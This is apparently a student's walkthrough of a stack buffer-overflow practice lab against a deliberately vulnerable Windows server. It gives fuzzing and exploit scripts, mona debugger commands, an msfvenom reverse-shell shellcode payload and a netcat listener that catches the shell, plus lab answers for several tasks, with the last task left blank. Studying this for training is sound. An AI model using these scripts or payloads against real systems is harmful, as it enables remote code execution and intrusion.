Practice stack based buffer overflows!

Task 1 - Deploy VM
-------------------------------

This is a Windows VM
Host: 10.10.11.255 -> oscp-bof-prep

Task 2 - oscp.exe - OVERFLOW1
---------------------------------------------------

In this task we run Imunity Debuger as Adminitrator.
We load a file called OSCP.exe which is a test executable for trying different tyes of overflows.

Imunity Debuger has Mona plugin installed.

https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst

First Open Immunity Debuger, then OPEN C:\Admin\Desktop\OSCP\OSCP.exe

Then under Debug do RUN.

This essentially runs the oscp.exe on port 1337. You can manually connect to it if you want using:

```bash
nc 10.10.11.255 1337

root@ip-10-10-23-238:~# nc 10.10.11.255 1337
Welcome to OSCP Vulnerable Server! Enter HELP for help.
help
UNKNOWN COMMAND
HELP
Valid Commands:
HELP
OVERFLOW1 [value]
OVERFLOW2 [value]
OVERFLOW3 [value]
OVERFLOW4 [value]
OVERFLOW5 [value]
OVERFLOW6 [value]
OVERFLOW7 [value]
OVERFLOW8 [value]
OVERFLOW9 [value]
OVERFLOW10 [value]
EXIT
OVERFLOW1 test
OVERFLOW1 COMPLETE

```

Configure Mona at the bottom of the debugger there is a text input:

```immunity
!mona config -set workingfolder c:\mona\%p
```

On the Attacker make the following script called fuzzer.py:

```python
#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.11.255"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
  ```

Then we use python3 to run it:

```bash
root@ip-10-10-23-238:~# python3 fuzzer.py 
Fuzzing with 100 bytes
Fuzzing with 200 bytes
Fuzzing with 300 bytes
Fuzzing with 400 bytes
Fuzzing with 500 bytes
Fuzzing with 600 bytes
Fuzzing with 700 bytes
Fuzzing with 800 bytes
Fuzzing with 900 bytes
Fuzzing with 1000 bytes
Fuzzing with 1100 bytes
Fuzzing with 1200 bytes
Fuzzing with 1300 bytes
Fuzzing with 1400 bytes
Fuzzing with 1500 bytes
Fuzzing with 1600 bytes
Fuzzing with 1700 bytes
Fuzzing with 1800 bytes
Fuzzing with 1900 bytes
Fuzzing with 2000 bytes
Fuzzing crashed at 2000 bytes

```

This fuzzer sends an increasing number of bytes to the server until it crashes. Make a note of what the max bytes were when it crashed.

Next we make an exploit:

```python
import socket

ip = "10.10.11.255"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

Save that on the attackbox as exploit.py

Next run this command to generate a cyclic pattern of 400bytes longer than the string that crashed the server.

```bash
root@ip-10-10-23-238:~# cp `locate pattern_create.rb` .
root@ip-10-10-23-238:~# ls
Desktop    exploit.py  Instructions       Pictures  Rooms    thinclient_drives
Downloads  fuzzer.py   pattern_create.rb  Postman   Scripts  Tools
root@ip-10-10-23-238:~# ./pattern_create.rb -l 2400
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9

```

Now paste the string in the the exploit.py in the payload="" variable.

Restart the debuger. You will have to open the file again because the EIP has changed due to the crash.

Now send the exploit:

```bash
root@ip-10-10-23-238:~# python3 exploit.py 
Sending evil buffer...
Done!

```

Now in the bottom of the debugger change the mona command:

```immunity
!mona findmsp -distance 2400
```

Should be the same as you found and used for the pattern you created.

Now in the logger you should be able to see what it found. You are looking for a line:

```immunity
EIP contains normal pattern : ... (offset XXXX)
```

In our case:

```immunity
EIP contains normal pattern: 0x6f43396e (offset 1978)
```

![[Screen Shot 2022-10-26 at 11.52.50 AM.png]]

So now we update our exploite.py script and set the offset variable to this value. Then set the Payload to empty string again, and the retn variable to "BBBB"

Restart oscp.exe in the debugger and run the modified exploit.py again. The EIP register should be overwritten with 4 B's (e.g. 42424242)

```python
prefix = "OVERFLOW1 "
offset = 1978
overflow = "A" * offset
retn = "BBBB"
payload = ""

```

Indeed the pointer was overwritten:

![[Screen Shot 2022-10-26 at 12.07.31 PM.png]]

The top right part show the registers and EIP contains 42424242.

__Finding Bad Characters__

Generate a bytearray using mona and exclude the null byte (\x00).
It should wind up where you setup mona to be the working directory (above) in C:\mona\oscp\bytearray.bin)

```immunity
!mona bytearray -b "\x00"
```

Now we need a string of bad characters to put into our exploit.

The following python code can generate a string of bad characters from \x01 to \xff

```python
for x in range(1, 256):
    print("\\x" + "{:02x}".format(x), end='')
print()
```

```bash
root@ip-10-10-23-238:~# python3 badchars.py 
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```

Update the exploit script to use a payload of the string you just generated of bad characters.

Now restart the debugger again on the OSCP.exe and run the modified exploit again.

This time you want to grap the ESP register value so you can use it in the next command.
![[Screen Shot 2022-10-26 at 2.10.20 PM 1.png]]
ESP: 0186FA30

```immunity
!mona compare -f C:\mona\oscp\bytearray.bin -a 0186FA30
```

![[Screen Shot 2022-10-26 at 2.14.30 PM.png]]

BadChars:
00 07 08 2e 2f a0 a1

You will compare each run's MAP with current ESP register to find any bad characters. 

You will remove them from the map AND the exploit.py code.

After the next run you should have no more bad characters. Verify with a new compairson of ESP:

```immunity
!mona compare -f C:\mona\oscp\bytearray.bin -a 01a3fa30
```

![[Screen Shot 2022-10-26 at 2.26.05 PM.png]]

The smaller window indicates 'unmodified'

When you have no more bad characters and ESP unmodified, you can move forward with fnding a jump point.'

__Finding a Jump Point__  

With the oscp.exe either running or in a crashed state, run the following mona command, making sure to update the -cpb option with all the badchars you identified (including \x00):  

`!mona jmp -r esp -cpb "\x00\x07\x08\x2e\x2f\xa0\xa1"`

We find 9 JMP pointers we can choose from which don't have one of our bad characters.

![[Screen Shot 2022-10-26 at 2.37.49 PM.png]]

Let's use 0x625011af.

So we need to update our exploit script with the RETN variable using the above flag written backwards (for extra evilness?)

retn = "\xaf\x11\x50\x62"

Now we just need to generate an exploit

`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.230.78 LPORT=4444 EXITFUNC=thread -b "\x00\x07\x08\x2e\x2f\xa0\xa1" -f c`

```bash
root@ip-10-10-230-78:~# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.230.78 LPORT=4444 EXITFUNC=thread -b "\x00\x07\x08\x2e\x2f\xa0\xa1" -f c
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of c file: 1500 bytes
unsigned char buf[] = 
"\xda\xdb\xd9\x74\x24\xf4\x5b\xba\xcc\x57\xf1\x1b\x2b\xc9\xb1"
"\x52\x83\xc3\x04\x31\x53\x13\x03\x9f\x44\x13\xee\xe3\x83\x51"
"\x11\x1b\x54\x36\x9b\xfe\x65\x76\xff\x8b\xd6\x46\x8b\xd9\xda"
"\x2d\xd9\xc9\x69\x43\xf6\xfe\xda\xee\x20\x31\xda\x43\x10\x50"
"\x58\x9e\x45\xb2\x61\x51\x98\xb3\xa6\x8c\x51\xe1\x7f\xda\xc4"
"\x15\x0b\x96\xd4\x9e\x47\x36\x5d\x43\x1f\x39\x4c\xd2\x2b\x60"
"\x4e\xd5\xf8\x18\xc7\xcd\x1d\x24\x91\x66\xd5\xd2\x20\xae\x27"
"\x1a\x8e\x8f\x87\xe9\xce\xc8\x20\x12\xa5\x20\x53\xaf\xbe\xf7"
"\x29\x6b\x4a\xe3\x8a\xf8\xec\xcf\x2b\x2c\x6a\x84\x20\x99\xf8"
"\xc2\x24\x1c\x2c\x79\x50\x95\xd3\xad\xd0\xed\xf7\x69\xb8\xb6"
"\x96\x28\x64\x18\xa6\x2a\xc7\xc5\x02\x21\xea\x12\x3f\x68\x63"
"\xd6\x72\x92\x73\x70\x04\xe1\x41\xdf\xbe\x6d\xea\xa8\x18\x6a"
"\x0d\x83\xdd\xe4\xf0\x2c\x1e\x2d\x37\x78\x4e\x45\x9e\x01\x05"
"\x95\x1f\xd4\x8a\xc5\x8f\x87\x6a\xb5\x6f\x78\x03\xdf\x7f\xa7"
"\x33\xe0\x55\xc0\xde\x1b\x3e\xe5\x14\xc5\xf0\x91\x2a\x09\x1c"
"\x3e\xa2\xef\x74\xae\xe2\xb8\xe0\x57\xaf\x32\x90\x98\x65\x3f"
"\x92\x13\x8a\xc0\x5d\xd4\xe7\xd2\x0a\x14\xb2\x88\x9d\x2b\x68"
"\xa4\x42\xb9\xf7\x34\x0c\xa2\xaf\x63\x59\x14\xa6\xe1\x77\x0f"
"\x10\x17\x8a\xc9\x5b\x93\x51\x2a\x65\x1a\x17\x16\x41\x0c\xe1"
"\x97\xcd\x78\xbd\xc1\x9b\xd6\x7b\xb8\x6d\x80\xd5\x17\x24\x44"
"\xa3\x5b\xf7\x12\xac\xb1\x81\xfa\x1d\x6c\xd4\x05\x91\xf8\xd0"
"\x7e\xcf\x98\x1f\x55\x4b\xb8\xfd\x7f\xa6\x51\x58\xea\x0b\x3c"
"\x5b\xc1\x48\x39\xd8\xe3\x30\xbe\xc0\x86\x35\xfa\x46\x7b\x44"
"\x93\x22\x7b\xfb\x94\x66";

```

Prepend NOPs

Since an encoder was likely used to generate the payload, you will need some space in memory for the payload to unpack itself. You can do this by setting the padding variable to a string of 16 or more "No Operation" (\x90) bytes:

```python
padding = "\x90" * 16
```

Here is the final script:

```python
root@ip-10-10-230-78:~# cat exploit.py 
import socket

ip = "10.10.118.22"
port = 1337

prefix = "OVERFLOW1 "
offset = 1978
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 16
postfix = ""
payload = ("\xda\xdb\xd9\x74\x24\xf4\x5b\xba\xcc\x57\xf1\x1b\x2b\xc9\xb1"
"\x52\x83\xc3\x04\x31\x53\x13\x03\x9f\x44\x13\xee\xe3\x83\x51"
"\x11\x1b\x54\x36\x9b\xfe\x65\x76\xff\x8b\xd6\x46\x8b\xd9\xda"
"\x2d\xd9\xc9\x69\x43\xf6\xfe\xda\xee\x20\x31\xda\x43\x10\x50"
"\x58\x9e\x45\xb2\x61\x51\x98\xb3\xa6\x8c\x51\xe1\x7f\xda\xc4"
"\x15\x0b\x96\xd4\x9e\x47\x36\x5d\x43\x1f\x39\x4c\xd2\x2b\x60"
"\x4e\xd5\xf8\x18\xc7\xcd\x1d\x24\x91\x66\xd5\xd2\x20\xae\x27"
"\x1a\x8e\x8f\x87\xe9\xce\xc8\x20\x12\xa5\x20\x53\xaf\xbe\xf7"
"\x29\x6b\x4a\xe3\x8a\xf8\xec\xcf\x2b\x2c\x6a\x84\x20\x99\xf8"
"\xc2\x24\x1c\x2c\x79\x50\x95\xd3\xad\xd0\xed\xf7\x69\xb8\xb6"
"\x96\x28\x64\x18\xa6\x2a\xc7\xc5\x02\x21\xea\x12\x3f\x68\x63"
"\xd6\x72\x92\x73\x70\x04\xe1\x41\xdf\xbe\x6d\xea\xa8\x18\x6a"
"\x0d\x83\xdd\xe4\xf0\x2c\x1e\x2d\x37\x78\x4e\x45\x9e\x01\x05"
"\x95\x1f\xd4\x8a\xc5\x8f\x87\x6a\xb5\x6f\x78\x03\xdf\x7f\xa7"
"\x33\xe0\x55\xc0\xde\x1b\x3e\xe5\x14\xc5\xf0\x91\x2a\x09\x1c"
"\x3e\xa2\xef\x74\xae\xe2\xb8\xe0\x57\xaf\x32\x90\x98\x65\x3f"
"\x92\x13\x8a\xc0\x5d\xd4\xe7\xd2\x0a\x14\xb2\x88\x9d\x2b\x68"
"\xa4\x42\xb9\xf7\x34\x0c\xa2\xaf\x63\x59\x14\xa6\xe1\x77\x0f"
"\x10\x17\x8a\xc9\x5b\x93\x51\x2a\x65\x1a\x17\x16\x41\x0c\xe1"
"\x97\xcd\x78\xbd\xc1\x9b\xd6\x7b\xb8\x6d\x80\xd5\x17\x24\x44"
"\xa3\x5b\xf7\x12\xac\xb1\x81\xfa\x1d\x6c\xd4\x05\x91\xf8\xd0"
"\x7e\xcf\x98\x1f\x55\x4b\xb8\xfd\x7f\xa6\x51\x58\xea\x0b\x3c"
"\x5b\xc1\x48\x39\xd8\xe3\x30\xbe\xc0\x86\x35\xfa\x46\x7b\x44"
"\x93\x22\x7b\xfb\x94\x66")

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

Now we just start a Netcat listner:

```bash
root@ip-10-10-230-78:~# nc -nlvp 4444
Listening on [0.0.0.0] (family 0, port 4444)
```

Restart the debugger with oscp.exe and run our exploit to get a reverse shell!

```bash
Connection from 10.10.118.22 49262 received!
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\admin\Desktop\vulnerable-apps\oscp>
```

Question: What is the EIP offset for OVERFLOW1?
Answer: _1978_

Question: In byte order (e.g. \x00\x01\0x2) and including the null byte \x00, what were the badchars for OVERFLOW1?

Bad chars were: \x00\x07\x08\x2e\x2f\xa0\xa1  however, bad characters can affect the characts next to them so we can remove those next to each other (2nd one)
Answer: _\x00\x07\x2e\xa0_

So honestly we could have generated our msfvenom payload using those 4 for the bad bytes.


Task3 - Overflow 2
------------------------------------
same thing as above for the next 9 tasks. I am only going to put the EIP and bad code answers:

EIP: EIP contains normal pattern: 0x76413176 (offset 634)

Question: What is the EIP offset for OVERFLOW2?
Answer: _634_

ESP: 0180FA30
`!mona compare -f C:\mona\oscp\bytearray.bin -a 0180FA30`
badchars: 00 23 24 3c 3d 83 84 ba bb

Question: In byte order (e.g. \x00\x01\0x2) and including the null byte \x00, what were the badchars for OVERFLOW2?
Answer: _\x00\x23\x3c\x83\xba_


Task4 - Overflow 3
-------------------------------------
Rinse and repeat.

EIP: 0x35714234 (offset 1274)

Answer: _1274_

ESP: 01CDFA30
`!mona compare -f C:\mona\oscp\bytearray.bin -a 01cdfa30 `
badchars: 00 11 12 40 41 5f 60 b8 b9 ee ef

Question: In byte order (e.g. \x00\x01\0x2) and including the null byte \x00, what were the badchars for OVERFLOW3?
Answer: _\x00\x11\x40\x5f\xb8\xee_


Task5 - Overflow 4
------------------------------------------

Rinse and repeat.

Fuzz crash at 2100.
We will use 2500

EIP: 0x70433570 (offset 2026)

Answer: _2026_

ESP: 01B0FA30
`!mona compare -f C:\mona\oscp\bytearray.bin -a 01b0fa30`
badchars: 00 a9 aa cd ce d4 d5

Question: In byte order (e.g. \x00\x01\0x2) and including the null byte \x00, what were the badchars for OVERFLOW3?
Answer: _\x00\xa9\xcd\xd4_


Task6 - Overflow 5
------------------------------------------

Rinse and repeat.

Fuzz crash at 400 bytes .
We will use 800.

EIP: 0x356b4134 (offset is 314)

Answer: _314_

ESP: 0191FA30
`!mona compare -f C:\mona\oscp\bytearray.bin -a 0191fa30`
badchars: 00 16 17 2f 30 f4 f5 fd

Question: In byte order (e.g. \x00\x01\0x2) and including the null byte \x00, what were the badchars for OVERFLOW3?
Answer: _\x00\x16\x2f\xf4\xfd_


Task7 - Overflow 6
------------------------------------------

Rinse and repeat.

Fuzz crash at  bytes 1100 .
We will use 1500

EIP: 0x35694234 (offset is 1034 )

Answer: 

ESP: 019FFA30
`!mona compare -f C:\mona\oscp\bytearray.bin -a 019ffa30`
badchars: 00 08 09 2c 2d ad ae

Question: In byte order (e.g. \x00\x01\0x2) and including the null byte \x00, what were the badchars for OVERFLOW3?
Answer: _\x00\x08\x2c\xad_



Task8 - Overflow 7
------------------------------------------

Rinse and repeat.

Fuzz crash at  1400 bytes.
We will use 1800

EIP: 0x72423572 (offset is 1306 )

Answer: _1306_

ESP: 0183FA30
`!mona compare -f C:\mona\oscp\bytearray.bin -a 0183fa30`
badchars: 00 8c 8d ae af be bf fb fc

Question: In byte order (e.g. \x00\x01\0x2) and including the null byte \x00, what were the badchars for OVERFLOW3?
Answer: _\x00\x8c\xae\xbe\xfb_

jmp: 0x625011af



Task9 - Overflow 8
------------------------------------------

Rinse and repeat.

Fuzz crash at   bytes.
We will use 

EIP: 0x (offset is  )

Answer: 

ESP: 
`!mona compare -f C:\mona\oscp\bytearray.bin -a `
badchars: 

Question: In byte order (e.g. \x00\x01\0x2) and including the null byte \x00, what were the badchars for OVERFLOW3?
Answer: 

